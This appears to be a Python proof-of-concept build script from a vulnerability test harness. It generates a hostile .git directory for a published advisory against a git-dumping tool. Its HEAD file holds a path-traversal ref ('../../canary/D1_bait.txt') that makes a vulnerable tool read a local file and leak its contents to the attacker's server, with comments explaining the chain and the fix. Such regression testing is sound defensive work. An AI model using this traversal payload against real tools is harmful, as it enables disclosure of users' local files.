"""Generate the malicious .git/ served by evil_server for D1.

The PoC tracks GHSA-hr3m-4qwq-3mgc: a server-controlled ``.git/HEAD``
of the form ``ref: ../../canary/D1_bait.txt`` makes a pre-fix pillager
read a file outside its output directory.  When that file contains a
40-char hex sequence, the pillager extracts it via
``add_hashes_parsed`` and emits a ``.git/objects/<aa>/<rest>`` GET to
the attacker.  Vulnerable pillager => evil_server's ``--watch-regex``
matches that GET => ``PWNED_D1`` canary appears => default oracle
flags FAIL.

The bait file itself is planted into the canary directory by the
harness's ``seed_files`` mechanism (see ``meta.toml``); ``build.py``
only owns the served ``.git/`` tree.
"""

from __future__ import annotations

import shutil
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAYLOAD = HERE / 'payload'

# Same 40-char hex that ``seed_files`` plants in canary_dir/D1_bait.txt.
# The pillager will extract this from the bait file's contents and
# attempt to GET .git/objects/de/adbeef... — that GET is what the
# evil server's watch_regex hooks.
BAIT_HEX = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef'

CONFIG = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
"""

# `../../canary/D1_bait.txt` joined onto temp_dst/.git/logs/ lands at
# /canary/D1_bait.txt inside the pillager's container.  Pre-fix
# add_head_file_tasks reads it; post-fix _is_safe_ref_segment rejects
# the `..` segments and skips the ref.
HEAD = 'ref: ../../canary/D1_bait.txt\n'


def main() -> None:
    if PAYLOAD.exists():
        shutil.rmtree(PAYLOAD)
    git_dir = PAYLOAD / '.git'
    git_dir.mkdir(parents=True)
    (git_dir / 'HEAD').write_text(HEAD)
    (git_dir / 'config').write_text(CONFIG)
    # Minimal autoindex content so pillagers that scrape directory
    # listings still find HEAD/config without needing index.html.
    print(f'Built D1 payload at {PAYLOAD} (bait hex: {BAIT_HEX})')


if __name__ == '__main__':
    main()
